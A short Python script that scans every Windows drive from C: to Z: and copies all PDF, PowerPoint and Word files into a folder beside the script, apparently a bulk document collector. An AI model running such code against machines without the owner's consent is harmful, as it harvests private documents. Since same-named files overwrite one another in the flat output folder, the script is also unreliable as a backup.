import os
import shutil


file_extensions = ['.pdf', '.ppt', '.pptx', '.doc', '.docx']


current_directory = os.path.dirname(os.path.abspath(__file__))


destination_directory = os.path.join(current_directory, 'copied_files')
os.makedirs(destination_directory, exist_ok=True)

def copy_files(source_directory):
    for root, _, files in os.walk(source_directory):
        for filename in files:
            file_extension = os.path.splitext(filename)[1].lower()
            if file_extension in file_extensions:
                source_path = os.path.join(root, filename)
                destination_path = os.path.join(destination_directory, filename)
                shutil.copy2(source_path, destination_path)
                print(f'Copied: {source_path} to {destination_path}')

if __name__ == "__main__":
    
    for drive in ['C:', 'D:', 'E:', 'F:', 'G:', 'H:', 'I:', 'J:', 'K:', 'L:', 'M:', 'N:', 'O:', 'P:', 'Q:', 'R:', 'S:', 'T:', 'U:', 'V:', 'W:', 'X:', 'Y:', 'Z:']:
        source_directory = os.path.join(drive, '\\')
        if os.path.exists(source_directory):
            copy_files(source_directory)
        else:
            print(f"Drive not found: {source_directory}")

    print("File copy completed.")
